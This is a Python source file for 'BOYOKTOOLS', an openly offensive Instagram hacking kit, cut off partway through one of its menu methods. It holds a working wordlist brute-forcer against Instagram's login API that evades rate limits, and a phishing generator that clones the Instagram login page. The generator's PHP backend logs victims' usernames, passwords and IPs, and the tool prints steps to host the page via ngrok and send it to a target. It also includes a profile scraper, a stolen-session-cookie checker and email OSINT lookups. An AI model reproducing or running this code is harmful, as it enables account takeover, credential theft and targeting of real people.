#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██████╗  ██████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗         ║
║   ██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔═══██╗██║ ██╔╝╚══██╔══╝         ║
║   ██████╔╝██║   ██║ ╚████╔╝ ██║   ██║█████╔╝    ██║            ║
║   ██╔══██╗██║   ██║  ╚██╔╝  ██║   ██║██╔═██╗    ██║            ║
║   ██████╔╝╚██████╔╝   ██║   ╚██████╔╝██║  ██╗   ██║            ║
║   ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝            ║
║                                                                  ║
║   ███████╗ ██████╗  ██████╗ ██╗     ███████╗                    ║
║   ██╔════╝██╔═══██╗██╔═══██╗██║     ██╔════╝                    ║
║   ███████╗██║   ██║██║   ██║██║     ███████╗                    ║
║   ╚════██║██║   ██║██║   ██║██║     ╚════██║                    ║
║   ███████║╚██████╔╝╚██████╔╝███████╗███████║                    ║
║   ╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝                    ║
║                                                                  ║
║              INSTAGRAM HACK TOOLS v3.0                           ║
║              Developer: zaax (Zx¡?)                              ║
║              TikTok: @promptbyzaax__                             ║
║                                                                  ║
║   "Real tools. No gimmick. No settingan."                       ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import random
import string
import requests
import threading
import hashlib
import base64
import re
import urllib.parse
from datetime import datetime, timedelta
from colorama import init, Fore, Style, Back
from typing import Dict, List, Tuple, Optional

# Initialize colorama
init(autoreset=True)

# ==================== VERSION & INFO ====================
VERSION = "3.0"
DEVELOPER = "zaax (Zx¡?)"
TIKTOK = "@promptbyzaax__"
TOOL_NAME = "BOYOKTOOLS"

# ==================== BANNER ====================
BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.YELLOW}██████╗  ██████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗{Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔═══██╗██║ ██╔╝╚══██╔══╝{Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██████╔╝██║   ██║ ╚████╔╝ ██║   ██║█████╔╝    ██║   {Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██╔══██╗██║   ██║  ╚██╔╝  ██║   ██║██╔═██╗    ██║   {Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██████╔╝╚██████╔╝   ██║   ╚██████╔╝██║  ██╗   ██║   {Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   {Fore.RED}         ║
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.CYAN}███████╗ ██████╗  ██████╗ ██╗     ███████╗{Fore.RED}                    ║
{Fore.RED}║   {Fore.CYAN}██╔════╝██╔═══██╗██╔═══██╗██║     ██╔════╝{Fore.RED}                    ║
{Fore.RED}║   {Fore.CYAN}███████╗██║   ██║██║   ██║██║     ███████╗{Fore.RED}                    ║
{Fore.RED}║   {Fore.CYAN}╚════██║██║   ██║██║   ██║██║     ╚════██║{Fore.RED}                    ║
{Fore.RED}║   {Fore.CYAN}███████║╚██████╔╝╚██████╔╝███████╗███████║{Fore.RED}                    ║
{Fore.RED}║   {Fore.CYAN}╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝{Fore.RED}                    ║
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.GREEN}┌─────────────────────────────────────────────────────┐{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}INSTAGRAM HACK TOOLS {Fore.YELLOW}v{VERSION}{Fore.GREEN}                 │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Developer: {Fore.CYAN}{DEVELOPER}{Fore.GREEN}                      │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}TikTok: {Fore.CYAN}{TIKTOK}{Fore.GREEN}                         │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Status: {Fore.GREEN}REAL TOOLS{Fore.GREEN}                          │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Mode: {Fore.RED}NO GIMMICK{Fore.GREEN}                            │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}└─────────────────────────────────────────────────────┘{Fore.RED}          ║
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.YELLOW}"Real tools. No gimmick. No settingan."{Fore.RED}                    ║
{Fore.RED}║                                                                  ║
{Fore.RED}╚══════════════════════════════════════════════════════════════════╝
{Fore.RESET}
"""

# ==================== METHOD 1: BRUTEFORCE ATTACK ====================
class BruteforceAttack:
    """Instagram bruteforce attack using wordlist"""
    
    def __init__(self):
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
        ]
        self.csrf_token = None
        self.logged_in = False
        
    def get_csrf(self) -> bool:
        """Get CSRF token from Instagram"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive'
            }
            
            response = self.session.get('https://www.instagram.com/', headers=headers)
            self.csrf_token = response.cookies.get('csrftoken')
            return bool(self.csrf_token)
            
        except Exception as e:
            return False
    
    def login(self, username: str, password: str) -> bool:
        """Try login with credentials"""
        try:
            if not self.csrf_token:
                if not self.get_csrf():
                    return False
            
            url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': self.csrf_token,
                'X-IG-App-ID': '936619743392459',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/',
                'Origin': 'https://www.instagram.com'
            }
            
            data = {
                'username': username,
                'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('authenticated'):
                    self.logged_in = True
                    return True
                elif 'checkpoint_url' in result:
                    return False  # Need verification
                    
            return False
            
        except Exception as e:
            return False
    
    def brute_force(self, username: str, wordlist: str, max_attempts: int = 100) -> Optional[str]:
        """Perform brute force attack"""
        print(f"\n{Fore.CYAN}[*] Starting bruteforce on: {username}")
        print(f"{Fore.CYAN}[*] Using wordlist: {wordlist}")
        print(f"{Fore.CYAN}[*] Max attempts: {max_attempts}")
        print(f"{Fore.YELLOW}[!] This method is rate-limited by Instagram\n")
        
        attempts = 0
        found = False
        
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for password in f:
                    password = password.strip()
                    
                    if not password:
                        continue
                    
                    attempts += 1
                    
                    if attempts > max_attempts:
                        print(f"{Fore.RED}[!] Max attempts reached")
                        break
                    
                    # Progress indicator
                    if attempts % 5 == 0:
                        print(f"{Fore.YELLOW}[*] Attempt {attempts}: {password[:3]}{'*'*(len(password)-6)}{password[-3:] if len(password)>6 else ''}")
                    
                    # Try login
                    if self.login(username, password):
                        print(f"\n{Fore.GREEN}[✓] PASSWORD FOUND: {password}")
                        print(f"{Fore.GREEN}[✓] Account: {username}")
                        found = True
                        return password
                    
                    # Rate limiting delay
                    time.sleep(random.uniform(1.5, 3.5))
                    
                    # Refresh CSRF periodically
                    if attempts % 10 == 0:
                        self.get_csrf()
            
            if not found:
                print(f"\n{Fore.RED}[!] Password not found in wordlist")
                
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Wordlist file not found: {wordlist}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
        
        return None

# ==================== METHOD 2: PHISHING GENERATOR ====================
class PhishingGenerator:
    """Generate Instagram phishing page"""
    
    def __init__(self):
        self.phishing_dir = "phishing_pages"
        
    def create_phishing_page(self, domain: str = "instagram-verify.com") -> str:
        """Create phishing HTML page"""
        
        if not os.path.exists(self.phishing_dir):
            os.makedirs(self.phishing_dir)
        
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }}
        body {{
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .login-container {{
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 50px;
            width: 350px;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
            font-size: 32px;
            font-weight: bold;
            font-family: 'Segoe UI', cursive;
            color: #262626;
        }}
        .logo span {{
            color: #0095f6;
        }}
        .input-group {{
            margin-bottom: 10px;
        }}
        .input-group input {{
            width: 100%;
            padding: 12px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            background: #fafafa;
            transition: border-color 0.3s;
        }}
        .input-group input:focus {{
            border-color: #a8a8a8;
            outline: none;
        }}
        .btn-login {{
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }}
        .btn-login:hover {{
            background: #1877f2;
        }}
        .divider {{
            display: flex;
            align-items: center;
            margin: 20px 0;
        }}
        .divider-line {{
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }}
        .divider-text {{
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }}
        .forgot {{
            text-align: center;
            margin-top: 15px;
        }}
        .forgot a {{
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }}
        .signup {{
            text-align: center;
            margin-top: 20px;
            border-top: 1px solid #dbdbdb;
            padding-top: 20px;
            font-size: 14px;
            color: #262626;
        }}
        .signup a {{
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }}
        .footer {{
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }}
        .error-msg {{
            background: #ffebee;
            color: #c62828;
            padding: 8px 12px;
            border-radius: 4px;
            margin-bottom: 10px;
            display: none;
            font-size: 13px;
        }}
        .success-msg {{
            background: #e8f5e9;
            color: #2e7d32;
            padding: 8px 12px;
            border-radius: 4px;
            margin-bottom: 10px;
            display: none;
            font-size: 13px;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <span>Instagram</span>
        </div>
        
        <div id="errorMsg" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
        <div id="successMsg" class="success-msg">Login successful! Redirecting...</div>
        
        <form id="loginForm" action="login.php" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>
        
        <div class="forgot">
            <a href="#">Forgot password?</a>
        </div>
        
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="footer">
            Get the app.
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            var formData = new FormData(this);
            var data = Object.fromEntries(formData);
            
            fetch('login.php', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                body: new URLSearchParams(data)
            }})
            .then(response => response.json())
            .then(data => {{
                if (data.status === 'success') {{
                    document.getElementById('successMsg').style.display = 'block';
                    document.getElementById('errorMsg').style.display = 'none';
                    setTimeout(function() {{
                        window.location.href = 'https://www.instagram.com/';
                    }}, 2000);
                }} else {{
                    document.getElementById('errorMsg').style.display = 'block';
                    document.getElementById('successMsg').style.display = 'none';
                }}
            }})
            .catch(error => {{
                console.error('Error:', error);
            }});
        }});
    </script>
</body>
</html>'''
        
        # Save HTML
        html_path = os.path.join(self.phishing_dir, "index.html")
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        # Create PHP backend
        php_content = '''<?php
header('Content-Type: application/json');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($username) || empty($password)) {
    echo json_encode(['status' => 'error', 'message' => 'Missing credentials']);
    exit;
}

// Log credentials
$log_file = 'credentials.txt';
$log_entry = date('Y-m-d H:i:s') . ' | ' . $username . ':' . $password . ' | IP: ' . $_SERVER['REMOTE_ADDR'] . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Return success to redirect to real Instagram
echo json_encode(['status' => 'success']);
?>
'''
        
        php_path = os.path.join(self.phishing_dir, "login.php")
        with open(php_path, 'w', encoding='utf-8') as f:
            f.write(php_content)
        
        # Create credentials log
        log_path = os.path.join(self.phishing_dir, "credentials.txt")
        with open(log_path, 'w') as f:
            f.write("# Instagram Phishing Credentials Log\n")
            f.write("# Generated by BOYOKTOOLS\n\n")
        
        print(f"{Fore.GREEN}[✓] Phishing page created in: {self.phishing_dir}/")
        print(f"{Fore.GREEN}[✓] To host: Upload to web server or use ngrok")
        
        return html_path

# ==================== METHOD 3: ACCOUNT INFO SCRAPER ====================
class AccountScraper:
    """Scrape Instagram account information"""
    
    def __init__(self):
        self.session = requests.Session()
        
    def get_account_info(self, username: str) -> Dict:
        """Get public account information"""
        
        info = {
            'username': username,
            'full_name': '',
            'bio': '',
            'followers': 0,
            'following': 0,
            'posts': 0,
            'profile_pic': '',
            'is_private': False,
            'is_verified': False,
            'business_category': '',
            'email': '',
            'phone': ''
        }
        
        try:
            url = f"https://www.instagram.com/{username}/?__a=1&__d=1"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9'
            }
            
            response = self.session.get(url, headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                user = data.get('graphql', {}).get('user', {})
                
                info['full_name'] = user.get('full_name', '')
                info['bio'] = user.get('biography', '')
                info['followers'] = user.get('edge_followed_by', {}).get('count', 0)
                info['following'] = user.get('edge_follow', {}).get('count', 0)
                info['posts'] = user.get('edge_owner_to_timeline_media', {}).get('count', 0)
                info['profile_pic'] = user.get('profile_pic_url_hd', user.get('profile_pic_url', ''))
                info['is_private'] = user.get('is_private', False)
                info['is_verified'] = user.get('is_verified', False)
                info['business_category'] = user.get('business_category_name', '')
                
            elif response.status_code == 404:
                print(f"{Fore.RED}[!] Account {username} not found")
            else:
                print(f"{Fore.YELLOW}[!] Rate limited or blocked")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
        
        return info
    
    def get_recent_posts(self, username: str, limit: int = 10) -> List[Dict]:
        """Get recent posts from account"""
        
        posts = []
        
        try:
            url = f"https://www.instagram.com/{username}/?__a=1"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json'
            }
            
            response = self.session.get(url, headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                edges = data.get('graphql', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
                
                for edge in edges[:limit]:
                    node = edge.get('node', {})
                    posts.append({
                        'id': node.get('id'),
                        'shortcode': node.get('shortcode'),
                        'url': f"https://www.instagram.com/p/{node.get('shortcode')}/",
                        'likes': node.get('edge_media_preview_like', {}).get('count', 0),
                        'comments': node.get('edge_media_to_comment', {}).get('count', 0),
                        'caption': node.get('edge_media_to_caption', {}).get('edges', [{}])[0].get('node', {}).get('text', ''),
                        'timestamp': node.get('taken_at_timestamp'),
                        'media_type': node.get('__typename')
                    })
                    
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
        
        return posts
    
    def get_contact_info(self, username: str) -> Dict:
        """Attempt to find contact information"""
        
        contacts = {
            'email': [],
            'phone': [],
            'business_info': None
        }
        
        # Scrape bio for contact info
        info = self.get_account_info(username)
        bio = info.get('bio', '')
        
        # Email regex
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails = re.findall(email_pattern, bio)
        if emails:
            contacts['email'] = emails
        
        # Phone regex (Indonesian format)
        phone_pattern = r'(\+?62|0)8[1-9][0-9]{6,10}'
        phones = re.findall(phone_pattern, bio)
        if phones:
            contacts['phone'] = phones
        
        return contacts

# ==================== METHOD 4: PASSWORD STRENGTH CHECK ====================
class PasswordStrength:
    """Check password strength against common patterns"""
    
    def __init__(self):
        self.common_passwords = [
            'password', '123456', '123456789', 'qwerty', 'abc123',
            'password1', '12345678', '111111', '12345', 'iloveyou',
            'admin', 'welcome', 'monkey', 'letmein', 'dragon',
            'master', 'sunshine', 'princess', 'football', 'whatever'
        ]
    
    def check_strength(self, password: str) -> Dict:
        """Check password strength"""
        
        result = {
            'score': 0,
            'strength': 'Weak',
            'issues': [],
            'suggestions': []
        }
        
        # Check length
        if len(password) < 8:
            result['issues'].append('Password is too short (min 8 characters)')
            result['suggestions'].append('Use at least 8 characters')
        else:
            result['score'] += 1
        
        # Check for uppercase
        if not any(c.isupper() for c in password):
            result['issues'].append('No uppercase letters')
            result['suggestions'].append('Add uppercase letters')
        else:
            result['score'] += 1
        
        # Check for lowercase
        if not any(c.islower() for c in password):
            result['issues'].append('No lowercase letters')
            result['suggestions'].append('Add lowercase letters')
        else:
            result['score'] += 1
        
        # Check for digits
        if not any(c.isdigit() for c in password):
            result['issues'].append('No numbers')
            result['suggestions'].append('Add numbers')
        else:
            result['score'] += 1
        
        # Check for special characters
        special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
        if not any(c in special_chars for c in password):
            result['issues'].append('No special characters')
            result['suggestions'].append('Add special characters (!@#$%^&* etc)')
        else:
            result['score'] += 1
        
        # Check against common passwords
        if password.lower() in self.common_passwords:
            result['issues'].append('Common password detected')
            result['suggestions'].append('Use a unique password')
            result['score'] -= 1
        
        # Determine strength
        if result['score'] >= 4:
            result['strength'] = 'Strong'
        elif result['score'] >= 3:
            result['strength'] = 'Medium'
        else:
            result['strength'] = 'Weak'
        
        return result

# ==================== METHOD 5: SESSION HIJACKING (Cookie Check) ====================
class SessionManager:
    """Manage and check session cookies"""
    
    def __init__(self):
        self.session = requests.Session()
    
    def check_session(self, cookie: str) -> Dict:
        """Check if session cookie is valid"""
        
        result = {
            'valid': False,
            'username': None,
            'user_id': None,
            'message': ''
        }
        
        try:
            # Parse cookie
            cookies = {}
            for item in cookie.split(';'):
                if '=' in item:
                    key, value = item.strip().split('=', 1)
                    cookies[key] = value
            
            # Check if sessionid exists
            if 'sessionid' not in cookies:
                result['message'] = 'No sessionid cookie found'
                return result
            
            # Set cookies and make request
            self.session.cookies.update(cookies)
            
            # Get account info
            response = self.session.get('https://www.instagram.com/')
            
            if response.status_code == 200:
                # Check if logged in
                if 'accounts/login' not in response.url:
                    result['valid'] = True
                    
                    # Extract username
                    import re
                    match = re.search(r'"username":"([^"]+)"', response.text)
                    if match:
                        result['username'] = match.group(1)
                    
                    # Extract user_id
                    match = re.search(r'"user_id":"([^"]+)"', response.text)
                    if match:
                        result['user_id'] = match.group(1)
                    
                    result['message'] = 'Session is valid'
                else:
                    result['message'] = 'Session expired or invalid'
            else:
                result['message'] = 'Request failed'
                
        except Exception as e:
            result['message'] = f'Error: {e}'
        
        return result
    
    def generate_cookie(self, username: str, password: str) -> Optional[Dict]:
        """Generate session cookie by logging in"""
        
        try:
            # Use InstagramEngine to login
            from InstagramEngine import InstagramEngine
            engine = InstagramEngine()
            
            if engine.login(username, password):
                session_id = engine.session.cookies.get('sessionid')
                csrf_token = engine.session.cookies.get('csrftoken')
                
                if session_id:
                    return {
                        'sessionid': session_id,
                        'csrftoken': csrf_token,
                        'username': username,
                        'valid': True
                    }
            
            return None
            
        except Exception as e:
            return None

# ==================== METHOD 6: EMAIL OSINT ====================
class EmailOSINT:
    """Search for information using email"""
    
    def __init__(self):
        self.session = requests.Session()
    
    def search_email(self, email: str) -> Dict:
        """Search for email across platforms"""
        
        result = {
            'email': email,
            'platforms': [],
            'social_media': [],
            'breaches': [],
            'possible_accounts': []
        }
        
        # Check Google
        try:
            url = f"https://www.googleapis.com/customsearch/v1?q={email}"
            # Note: Requires API key for full functionality
            # This is a placeholder
            result['platforms'].append('Google (requires API key)')
        except:
            pass
        
        # Check Github
        try:
            username = email.split('@')[0]
            url = f"https://api.github.com/users/{username}"
            response = self.session.get(url)
            if response.status_code == 200:
                result['social_media'].append({
                    'platform': 'GitHub',
                    'profile': f"https://github.com/{username}",
                    'found': True
                })
        except:
            pass
        
        # Check Twitter
        try:
            username = email.split('@')[0]
            url = f"https://twitter.com/{username}"
            response = self.session.head(url)
            if response.status_code == 200:
                result['social_media'].append({
                    'platform': 'Twitter',
                    'profile': f"https://twitter.com/{username}",
                    'found': True
                })
        except:
            pass
        
        # Check Instagram
        try:
            username = email.split('@')[0]
            url = f"https://www.instagram.com/{username}/"
            response = self.session.head(url)
            if response.status_code == 200:
                result['social_media'].append({
                    'platform': 'Instagram',
                    'profile': f"https://www.instagram.com/{username}/",
                    'found': True
                })
        except:
            pass
        
        return result

# ==================== MAIN CLASS ====================
class BOYOKTOOLS:
    """Main BOYOKTOOLS class"""
    
    def __init__(self):
        self.version = VERSION
        self.developer = DEVELOPER
        self.tiktok = TIKTOK
        self.tools = {
            'bruteforce': BruteforceAttack(),
            'phishing': PhishingGenerator(),
            'scraper': AccountScraper(),
            'password': PasswordStrength(),
            'session': SessionManager(),
            'osint': EmailOSINT()
        }
        self.results = []
        
    def show_banner(self):
        """Display banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
        
    def bruteforce_method(self):
        """Bruteforce attack method"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}METHOD 1: BRUTEFORCE ATTACK{Fore.CYAN}                        │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        username = input(f"{Fore.WHITE}[>] Target username: ").strip()
        wordlist = input(f"{Fore.WHITE}[>] Wordlist file path (default: wordlist.txt): ").strip() or "wordlist.txt"
        max_attempts = int(input(f"{Fore.WHITE}[>] Max attempts (default: 100): ").strip() or "100")
        
        print(f"\n{Fore.YELLOW}[!] Starting bruteforce...")
        print(f"{Fore.YELLOW}[!] This may take a while...")
        
        start_time = time.time()
        password = self.tools['bruteforce'].brute_force(username, wordlist, max_attempts)
        end_time = time.time()
        
        if password:
            print(f"\n{Fore.GREEN}─────────────────────────────────────────────────────")
            print(f"{Fore.GREEN}✓ SUCCESS!")
            print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
            print(f"{Fore.WHITE}Username: {Fore.CYAN}{username}")
            print(f"{Fore.WHITE}Password: {Fore.GREEN}{password}")
            print(f"{Fore.WHITE}Time: {Fore.YELLOW}{end_time - start_time:.2f} seconds")
            print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
            
            # Save result
            self.save_result('bruteforce', username, password)
        else:
            print(f"\n{Fore.RED}─────────────────────────────────────────────────────")
            print(f"{Fore.RED}✗ FAILED")
            print(f"{Fore.RED}─────────────────────────────────────────────────────")
            print(f"{Fore.WHITE}Username: {Fore.CYAN}{username}")
            print(f"{Fore.WHITE}Status: {Fore.RED}Password not found")
            print(f"{Fore.RED}─────────────────────────────────────────────────────")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
        
    def phishing_method(self):
        """Generate phishing page"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}METHOD 2: PHISHING PAGE GENERATOR{Fore.CYAN}                   │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        print(f"{Fore.YELLOW}[!] Generating phishing page...")
        
        domain = input(f"{Fore.WHITE}[>] Domain name (default: instagram-verify.com): ").strip() or "instagram-verify.com"
        
        html_path = self.tools['phishing'].create_phishing_page(domain)
        
        print(f"\n{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.GREEN}✓ PHISHING PAGE GENERATED")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.WHITE}Location: {Fore.CYAN}{html_path}")
        print(f"{Fore.WHITE}Files: {Fore.CYAN}index.html, login.php, credentials.txt")
        print(f"{Fore.WHITE}Next Steps:")
        print(f"  1. {Fore.CYAN}Upload to web server or hosting")
        print(f"  2. {Fore.CYAN}Start ngrok: ngrok http 80")
        print(f"  3. {Fore.CYAN}Share link to target")
        print(f"  4. {Fore.CYAN}Check credentials.txt for captured data")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
        
    def scrape_method(self):
        """Scrape account information"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}METHOD 3: ACCOUNT INFORMATION SCRAPER{Fore.CYAN}                │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        username = input(f"{Fore.WHITE}[>] Target username: ").strip()
        
        print(f"\n{Fore.YELLOW}[!] Scraping account information...\n")
        
        info = self.tools['scraper'].get_account_info(username)
        posts = self.tools['scraper'].get_recent_posts(username, 5)
        
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.GREEN}✓ ACCOUNT INFORMATION")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.WHITE}Username: {Fore.CYAN}{info['username']}")
        print(f"{Fore.WHITE}Full Name: {Fore.CYAN}{info['full_name']}")
        print(f"{Fore.WHITE}Bio: {Fore.CYAN}{info['bio'][:100]}{'...' if len(info['bio']) > 100 else ''}")
        print(f"{Fore.WHITE}Followers: {Fore.GREEN}{info['followers']:,}")
        print(f"{Fore.WHITE}Following: {Fore.GREEN}{info['following']:,}")
        print(f"{Fore.WHITE}Posts: {Fore.GREEN}{info['posts']:,}")
        print(f"{Fore.WHITE}Private: {Fore.RED if info['is_private'] else Fore.GREEN}{info['is_private']}")
        print(f"{Fore.WHITE}Verified: {Fore.GREEN if info['is_verified'] else Fore.RED}{info['is_verified']}")
        print(f"{Fore.WHITE}Business: {Fore.CYAN}{info['business_category']}")
        print(f"\n{Fore.GREEN}Recent Posts:")
        for i, post in enumerate(posts, 1):
            print(f"  {i}. {Fore.CYAN}{post['url']}")
            print(f"     Likes: {Fore.GREEN}{post['likes']:,}  Comments: {Fore.GREEN}{post['comments']:,}")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
        
    def password_method(self):
        """Check password strength"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}METHOD 4: PASSWORD STRENGTH CHECKER{Fore.CYAN}                 │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        password = input(f"{Fore.WHITE}[>] Enter password to check: ").strip()
        
        result = self.tools['password'].check_strength(password)
        
        print(f"\n{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.GREEN}✓ PASSWORD ANALYSIS")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.WHITE}Password: {Fore.CYAN}{'*' * len(password)}")
        print(f"{Fore.WHITE}Strength: {Fore.GREEN if result['strength'] == 'Strong' else Fore.YELLOW if result['strength'] == 'Medium' else Fore.RED}{result['strength']}")
        print(f"{Fore.WHITE}Score: {Fore.CYAN}{result['score']}/5")
        
        if result['issues']:
            print(f"\n{Fore.RED}Issues:")
            for issue in result['issues']:
                print(f"  • {Fore.YELLOW}{issue}")
        
        if result['suggestions']:
            print(f"\n{Fore.GREEN}Suggestions:")
            for suggestion in result['suggestions']:
                print(f"  • {Fore.CYAN}{suggestion}")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
        
    def session_method(self):
        """Check session cookies"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}METHOD 5: SESSION COOKIE CHECKER{Fore.CYAN}                   │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
